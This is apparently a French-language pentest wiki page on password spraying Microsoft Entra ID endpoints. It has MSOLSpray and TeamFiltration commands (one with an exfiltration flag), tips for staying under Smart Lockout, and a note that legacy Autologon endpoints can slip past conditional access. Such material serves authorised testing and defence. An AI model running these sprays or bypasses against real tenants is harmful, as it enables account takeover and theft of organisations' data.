---
title: "Password spraying : deviner des identifiants dans les limites de Smart Lockout"
order: 2
description: "Pulvériser des identifiants contre les endpoints de connexion Entra tout en respectant Smart Lockout : MSOLSpray et AADInternals contre Graph, Autologon et les endpoints d'authentification legacy."
keywords:
  - password spraying
  - MSOLSpray
  - Smart Lockout
  - authentification legacy
  - Autologon
---

# Password spraying

Avec une liste d'utilisateurs validée, un spray low-and-slow d'un ou deux mots de passe courants sur de nombreux comptes trouve l'identifiant faible sans verrouiller tout le monde. Le endpoint importe : certains signalent l'état Smart Lockout et MFA, et les endpoints legacy se comportent différemment des modernes.

## Pulvérisation

```powershell
# MSOLSpray against the Azure AD authentication endpoint; reports MFA/locked/disabled
Invoke-MSOLSpray -UserList users.txt -Password 'Autumn2026!'
```

```bash
# TeamFiltration spray + exfil
teamfiltration --spray --exfil --users users.txt --password 'Autumn2026!'
```

## Notes d'exploitation

- Tenez-vous-en à un mot de passe par fenêtre de verrouillage sur toute la liste ; Smart Lockout suit les mauvaises tentatives par compte, pas par source.
- MSOLSpray signale les comptes valides-mais-MFA, désactivés ou verrouillés, ce qui trie les résultats pour vous.
- Les endpoints **Autologon** et autres endpoints d'authentification legacy contournent parfois les politiques d'accès conditionnel cadrées sur l'authentification moderne, de sorte qu'un identifiant qui échoue en interactif peut quand même fonctionner là.

## Outils

- **MSOLSpray** (dafthack) : spray avec rapport d'état.
- **TeamFiltration** / **o365spray** : spray et exfiltration.
- **AADInternals** : connexion contre plusieurs endpoints.

## Références

- [MSOLSpray (dafthack)](https://github.com/dafthack/MSOLSpray)
- [TeamFiltration (Flangvik)](https://github.com/Flangvik/TeamFiltration)
- [HackTricks Cloud : Azure password spraying](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
